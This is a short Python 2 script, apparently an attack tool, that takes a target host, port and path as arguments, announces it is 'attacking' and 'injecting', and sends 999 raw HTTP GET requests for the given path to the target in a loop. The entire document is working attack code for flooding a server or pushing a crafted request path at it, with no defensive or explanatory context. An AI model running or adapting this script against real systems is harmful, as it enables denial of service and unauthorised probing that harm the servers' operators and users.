import socket, sys, os  
print "[*] Attacking " + sys.argv[1] + sys.argv[2]  + " ... [*]"  
print "[*]injecting " + sys.argv[3];  
def attack():  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((sys.argv[1], int(sys.argv[2])))  
    print ">> GET /" + sys.argv[3] + " HTTP/1.1"  
    s.send("GET /" + sys.argv[3] + " HTTP/1.1\r\n")  
    s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
    s.close()  
for i in range(1, 1000):  
    attack()  
